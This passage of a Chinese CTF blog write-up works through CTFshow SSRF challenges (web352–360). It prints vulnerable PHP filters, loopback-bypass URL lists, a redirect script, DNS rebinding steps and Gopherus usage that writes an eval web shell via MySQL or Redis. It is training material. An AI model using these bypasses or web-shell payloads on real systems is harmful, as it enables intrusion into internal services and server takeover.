+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|     你访问的网站         |</span><br><span class="line"><span class="section">|  http://...:5000         |</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v 你传入 SSRF URL</span></span><br><span class="line"><span class="code">     /image?url=http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="section">| 外部 Flask 服务 (5000端口)|</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v 发起请求</span></span><br><span class="line"><span class="code">     http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line">| 内部 Flask 服务（随机端口）|</span><br><span class="line">| 可能在 5001~6000 之间      |</span><br><span class="line"><span class="section">| 提供 /image/flag.jpg 接口  |</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因此需要抓包爆破，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png" alt="image-20250416011910810"></p>
+<p>成功爆出图片，截图OCR并修改即可。</p>
+<h2 id="CTFshow刷题"><a href="#CTFshow刷题" class="headerlink" title="CTFshow刷题"></a>CTFshow刷题</h2><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>相比于上题，waf了本地回环地址，尝试用其他进制的IP绕过即可。</p>
+<p>但实际上，这里源码是写错了，没有传参匹配导致恒为真，所以没有任何限制。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416002956517.png" alt="image-20250416002956517"></p>
+<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>正则如下：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/localhost</span>|127\<span class="string">.0</span>\.|\。<span class="string">/i</span></span><br></pre></td></tr></table></figure>
+
+<p>多过滤了<code>。</code>还是用上题的思路即可。</p>
+<p>这题有多种绕过思路，网上都总结了很多，这里随便贴一份相对全的：</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">进制绕过 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">特殊的地址<span class="number">0</span>，		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</span></span><br><span class="line"></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //可省略0</span></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">特殊字符       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//①②⑦.⓪.⓪.①/flag.php</span></span><br><span class="line">用中文句号绕过  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127。0。0。1/</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web354-公共解析域名绕过"><a href="#web354-公共解析域名绕过" class="headerlink" title="web354 公共解析域名绕过"></a>web354 公共解析域名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤了0和1就有些难搞了，不过这里可以去网上搜索一些公共的能够域名解析到127.0.0.1的url。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416080803299.png" alt="image-20250416080803299"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//safe.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//114.taobao.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//wifi.aliyun.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//imis.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost.sec.qq.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//ecd.tencent.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//sudo.cc/</span></span><br></pre></td></tr></table></figure>
+
+<p>直接用就好了。</p>
+<p>更多的可以通过域名解析结果反向查找：<a target="_blank" rel="noopener" href="https://site.ip138.com/127.0.0.1/">127.0.0.1上的网站 127.0.0.1同iP域名查询 127.0.0.1域名反查</a></p>
+<h3 id="web355-长度限制1"><a href="#web355-长度限制1" class="headerlink" title="web355 长度限制1"></a>web355 长度限制1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>) &lt;= <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
+
+<p>增加了长度限制，用<code>url=http://0/flag.php</code>、 <code>url=http://127.1/flag.php</code>都可以。</p>
+<h3 id="web356-长度限制2"><a href="#web356-长度限制2" class="headerlink" title="web356 长度限制2"></a>web356 长度限制2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>url=http://0/flag.php</code>仍然可用。</p>
+<h3 id="web357-内网IP过滤"><a href="#web357-内网IP过滤" class="headerlink" title="web357 内网IP过滤"></a>web357 内网IP过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>经过了一些过滤，我们去查查这些都是什么：</p>
+<h4 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var() 函数"></a>filter_var() 函数</h4><p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416083848457.png" alt="image-20250416083848457"></p>
+<h4 id="相关过滤器"><a href="#相关过滤器" class="headerlink" title="相关过滤器"></a>相关过滤器</h4><table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://www.runoob.com/php/filter-validate-ip.html">FILTER_VALIDATE_IP</a></th>
+<th>把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围。</th>
+</tr>
+</thead>
+</table>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416084453141.png" alt="image-20250416084453141"></p>
+<p>所以可知，要求ip不在 RFC 指定的私有范围IP内（比如 192.168.0.1），也不在保留的IP范围内。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>范围</th>
+<th>为什么被限制？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>私有地址</td>
+<td><code>10.</code>, <code>172.16-31.</code>, <code>192.168.</code></td>
+<td>内网地址，不能让用户探测</td>
+</tr>
+<tr>
+<td>保留地址</td>
+<td><code>127.</code>, <code>169.254.</code>, <code>224.</code>, <code>240.</code>, <code>255.</code></td>
+<td>有特殊含义&#x2F;不允许外部通信</td>
+</tr>
+</tbody></table>
+<p>以下两种方法实操可见最下方的bypass总结中。</p>
+<p><strong>method1 公网挂马</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/Quicker_20250416_091903.png" alt="Quicker_20250416_091903"></p>
+<p><strong>method2 DNS重绑定</strong></p>
+<p>常用工具<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
+<p>构造恰当的URL，例如用google，baidu这些官网的dns解析ip来进行交替（ping 可以查看），可以看到DNS解析在不断变换：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416102926004.png" alt="image-20250416102926004"></p>
+<p>没成功的话，多刷新几次。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416105222070.png" alt="image-20250416105222070"></p>
+<h3 id="web358-绕过"><a href="#web358-绕过" class="headerlink" title="web358 @绕过"></a>web358 @绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>需要匹配正则表达，满足<code>http://ctf.</code>开头，<code>show</code>结尾，而且能解析。</p>
+<p>构造如下：</p>
+<p><a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p>
+<p>利用参数查询<code>?</code>，或者锚点<code>#</code>绕过show</p>
+<p>在Parse_url函数中我们提到过，该函数会把@前后分段开，分为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[host] =&gt; hostname			<span class="comment">//@后</span></span><br><span class="line">[user] =&gt; username			<span class="comment">//@前</span></span><br><span class="line">[pass] =&gt; password			<span class="comment">//@前</span></span><br></pre></td></tr></table></figure>
+
+<p>于是它实际解析的仍然是指向127.0.0.1的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416112945370.png" alt="image-20250416112945370"></p>
+<h3 id="web359-Gopher打无密码的mysql"><a href="#web359-Gopher打无密码的mysql" class="headerlink" title="web359 Gopher打无密码的mysql"></a>web359 Gopher打无密码的mysql</h3><p>进来一个登录框，抓包发现有一个returl参数，</p>
+<p>需要下载一个生成gopher协议的payload工具：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<p>usage：<code>python2 gopherus.py --exploit mysql</code></p>
+<p>用户为root,query为 <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
+<p>并且将生成的payload再次进行url编码，因为解析时会解密一层。</p>
+<p>替换到returl参数的值后发包，然后蚁剑连接即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416193201139.png" alt="image-20250416193201139"></p>
+<h3 id="web360-Gopher协议打redis"><a href="#web360-Gopher协议打redis" class="headerlink" title="web360 Gopher协议打redis"></a>web360 Gopher协议打redis</h3><p>hint：打redis</p>
+<p>同上题一样，换个payload，usage：<code>python2 gopherus.py --exploit redis</code></p>
+<p>操作一样，最后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png" alt="image-20250416194828764"></p>
+<h2 id="刷题之后的bypass总结"><a href="#刷题之后的bypass总结" class="headerlink" title="刷题之后的bypass总结"></a>刷题之后的bypass总结</h2><h3 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h3><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">进制绕过 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>绕过		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">特殊的地址<span class="number">0</span>，		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</span></span><br><span class="line"></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //可省略0</span></span><br><span class="line">还有			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">特殊字符       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//①②⑦.⓪.⓪.①/flag.php</span></span><br><span class="line">用中文句号绕过  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127。0。0。1/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="公网挂马"><a href="#公网挂马" class="headerlink" title="公网挂马"></a>公网挂马</h3><p>打重定向</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段 PHP 脚本的作用是：</p>
+<ul>
+<li><p>当某个目标服务器访问你的公网服务时，比如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-public-ip:port/malicious.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>它会返回一个 HTTP 重定向：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>于是，<strong>如果目标服务器自动跟随重定向</strong>，它会**转头请求自己的 <code>127.0.0.1/flag.php</code>**。</p>
+</li>
+</ul>
+<h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><p>参考：<a target="_blank" rel="noopener" href="https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/04.SSRF/01.DNS%E9%87%8D%E7%BB%91%E5%AE%9A.html">01.DNS重绑定 · d4m1ts 知识库</a></p>
+<p>常用工具<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
+<p>指攻击者通过DNS服务器将域名解析到恶意IP地址，然后再将其解析到合法IP地址，从而绕过后端的安全检查。<strong>其本质就是欺骗客户端请求的IP地址。</strong></p>
+<p>看网上的文章感觉不是很形象，但GPT的讲解很通透，我在这里贴一下：</p>
+<blockquote>
+<h2 id="💡-实战场景举个例子"><a href="#💡-实战场景举个例子" class="headerlink" title="💡 实战场景举个例子"></a>💡 实战场景举个例子</h2><p>设想有一个网站：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /fetch?url=http://example.com</span><br></pre></td></tr></table></figure>
+
+<p>它会请求你传的 <code>url</code>，但有如下限制：</p>
+<ul>
+<li>❌ 禁止 IP 是 <code>127.0.0.1</code></li>
+<li>✅ 允许你填入域名，例如 <code>evil.rbndr.us</code></li>
+</ul>
+<p>你设置 <code>evil.rbndr.us</code> 这个域名：</p>
+<ul>
+<li><strong>第一次解析：指向你的服务器（公网 IP）</strong></li>
+<li>**第二次解析：变成 <code>127.0.0.1</code> 或 <code>169.254.169.254</code>**！</li>
+</ul>
+<p>于是 SSRF 访问你的域名 → 其实打到了 <strong>目标的内网服务</strong>。</p>
+<h2 id="🧠-详细过程"><a href="#🧠-详细过程" class="headerlink" title="🧠 详细过程"></a>🧠 详细过程</h2><ol>
+<li>SSRF 发请求：<code>http://evil.rbndr.us</code></li>
+<li>DNS 解析 <code>evil.rbndr.us</code>，第一次解析结果是你的公网 IP</li>
+<li>目标服务请求了你服务器（你控制）</li>
+<li>你服务器<strong>什么也不返回，挂着不处理</strong></li>
+<li>等 DNS 缓存过期后（几秒）</li>
+<li>再次解析 <code>evil.rbndr.us</code> → <strong>变成 <code>127.0.0.1</code></strong></li>
+<li>SSRF 继续跟随请求：访问 <code>http://127.0.0.1</code></li>
+</ol>
+<p>💥 成功 SSRF 打到了内网！</p>
+</blockquote>
+<h3 id="Gopherus使用"><a href="#Gopherus使用" class="headerlink" title="Gopherus使用"></a>Gopherus使用</h3><ol>
+<li><p>安装</p>
+ <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload支持:</p>
+<ul>
+<li>MySQL 有效负载</li>
+<li>FastCGI 有效负载</li>
+<li>Memcached 有效负载</li>
+<li>Redis 有效负载</li>
+<li>Zabbix 有效载荷</li>
+<li>SMTP 有效负载</li>
+</ul>
+</li>
+<li><p>以无密码mysql为例：</p>
+<p> usage：<code>python2 gopherus.py --exploit mysql</code></p>
